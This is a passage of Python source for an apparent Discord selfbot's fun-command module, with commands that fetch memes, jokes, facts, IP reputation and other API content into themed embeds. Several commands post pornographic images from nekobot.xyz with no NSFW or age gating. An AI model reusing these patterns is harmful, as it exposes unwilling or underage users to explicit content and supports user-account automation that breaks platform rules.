        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)




    @React.command(usage="hentai", description="Shows a hentai image")
    async def hentai(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=hentai')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="hentaianal", description="Shows a hentai anal image")
    async def hentaianal(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=hanal')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Anal',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="hentaiboobs", description="Shows a hentai boobs image")
    async def hentaiboobs(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=hboobs')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Boobs',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="hentaitentacle", description="Shows a hentai tentacle image")
    async def hentaitentacle(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=tentacle')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Tentacle',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def hentaibara(ctx):
        
    #     request = requests.get(f'http://barapi.geopjr.xyz/json.php')
    #     data = request.json()
    #     link = data['link']
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Bara',timestamp=embed_timestamp())
    #     embed.set_image(url=link)
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    @React.command(usage="porngif", description="Shows a porn gif image")
    async def porngif(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=pgif')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Porn Gif',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="meme", description="Shows a random meme")
    async def meme(ctx):
        
        request = requests.get(f'https://meme-api.herokuapp.com/gimme')
        data = request.json()
        link = data['url']
        title = data['title']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=title,timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="uselessfact", description="Shows a random useless fact")
    async def uselessfact(ctx):
        
        request = requests.get(f'https://uselessfacts.jsph.pl/random.json?language=en')
        data = request.json()
        fact = data['text']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Useless Fact', description=f'> {fact}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="dogfact", description="Random dog fact")
    async def dogfact(ctx):
        request = requests.get(f'https://some-random-api.ml/facts/dog')
        data = request.json()
        fact = data['fact']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Dog Fact', description=f'{fact}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="catfact", description="Random cat fact")
    async def catfact(ctx):
        request = requests.get(f'https://catfact.ninja/fact')
        data = request.json()
        fact = data['fact']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Cat Fact', description=f'{fact}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="dadjoke", description="Tells a dad joke")
    async def dadjoke(ctx):
        
        request = requests.get(f'https://icanhazdadjoke.com/', headers={'accept': 'application/json'})
        data = request.json()
        joke = data['joke']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Dad Joke', description=f'{joke}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="joke", description="Tells a joke")
    async def joke(ctx):
        
        request = requests.get(f'http://www.official-joke-api.appspot.com/random_joke')
        data = request.json()
        setup = data['setup']
        punchline = data['punchline']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Joke', description=f'{setup}\n||{punchline}||',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    # @React.command()
    # async def riddle(ctx):
        
    #     request = requests.get(f'https://no-api-key.com/api/v1/riddle')
    #     data = request.json()
    #     question = data['question']
    #     answer = data['answer']
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Riddle', description=f'{question}\n||{answer}||',timestamp=embed_timestamp())
    #     embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="numberfact <Number>", description="Shows a fact about a number")
    async def numberfact(ctx, number):
        request = requests.get(f'http://numbersapi.com/{number}')
        data = request.content
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Number Fact about {number}', description=f'{data.decode("ascii")}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="advice", description="Gives a random advice")
    async def advice(ctx):
        
        request = requests.get(f'https://api.adviceslip.com/advice')
        data = request.json()
        slip = data['slip']
        advice = slip['advice']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Advice', description=f'{advice}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="bored", description="Generates a random activity")
    async def bored(ctx):
        
        request = requests.get(f'https://www.boredapi.com/api/activity')
        data = request.json()
        activity = data['activity']
        _type = data['type']
        participants = data['participants']
        price = data['price']
        link = data['link']
        accessibility = data['accessibility']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Bored',timestamp=embed_timestamp())
        embed.add_field(name = "__üéØ Activity__", value = f"{activity if activity else 'None'}", inline=True)
        embed.add_field(name = "__üé≠ Type__", value = f"{_type.capitalize() if _type else 'None'}", inline=True)
        embed.add_field(name = "__üéé Participants__", value = f"{participants if participants else 'None'}", inline=True)
        embed.add_field(name = "__üí≥ Price__", value = f"{f'{int(float(price) * 10)}/10' if price else 'None'}", inline=True)
        embed.add_field(name = "__üîì Accessibility__", value = f"{f'{int(float(accessibility) * 10)}/10' if accessibility else 'None'}", inline=True)
        embed.add_field(name = "__üåê Link__", value = f"{link if link else 'None'}", inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="netflixroulette", description="Generates a random netflix show")
    async def netflixroulette(ctx):
        
        request = requests.get(f'https://api.reelgood.com/v3.0/content/random?availability=onAnySource&content_kind=both&nocache=true&region=de&sources=netflix')
        data = request.json()
        _id = data['id']
        title = data['title']
        overview = data['overview']
        release = data['released_on']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Netflix Roulette',timestamp=embed_timestamp())
        embed.add_field(name = "__üìõ Title__", value = f"{title}", inline=False)
        embed.add_field(name = "__üí≠ Overview__", value = f"{overview}", inline=False)
        embed.add_field(name = "__üïí Release Date__", value = f"{release}", inline=False)
        embed.set_thumbnail(url=f'https://img.reelgood.com/content/movie/{_id}/poster-780.jpg')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="iptype <IP Address>", description="Displays whether the IP is bad and what type it is")
    async def iptype(ctx, ip: str):
        
        request = requests.get(f'https://api.iplegit.com/info?ip={ip}')
        data = request.json()
        bad = data['bad']
        _type = data['type']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='IP Type',timestamp=embed_timestamp())
        embed.add_field(name = "__üîå IP Address__", value = f"{ip}", inline=True)
        embed.add_field(name = "__üö´ Bad__", value = f"{bool(bad)}", inline=True)
        embed.add_field(name = "__üåÄ Type__", value = f"{_type.capitalize()}", inline=True)
        embed.set_thumbnail(url=f'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fhostus.us%2Fimg%2Fip-icon.png&f=1&nofb=1')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="unixtime <Timestamp>", description="Converts an UNIX timestamp to time (UTC)")
    async def unixtime(ctx, timestamp: int):
        
        request = requests.get(f'https://showcase.api.linx.twenty57.net/UnixTime/fromunix?timestamp={timestamp}')
        time = request.content.decode()
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Unix Time',timestamp=embed_timestamp())
        embed.add_field(name = "__‚è≤ Timestamp__", value = timestamp, inline=True)
        embed.add_field(name = "__üïí Time__", value = f"{time}", inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="randomnumber [Minimum] [Maximum]", description="Generates a random number")
    async def randomnumber(ctx, minimum: int=None, maximum: int=None):
        try:
            if minimum is not None and maximum is not None:
                result = int(random.randint(minimum, maximum))
            else:
                result = int(random.randint(0, 10000000))
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Random Number',timestamp=embed_timestamp())
            embed.add_field(name = "__1Ô∏è‚É£ Minimum__", value = minimum, inline=True)
            embed.add_field(name = "__üîü Maximum__", value = maximum, inline=True)
            embed.add_field(name = "__‚òëÔ∏è Result__", value = result, inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="fml", description="Sends a random FML")
    async def fml(ctx):
        
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=fml')
        data = request.json()
        text = data['text']
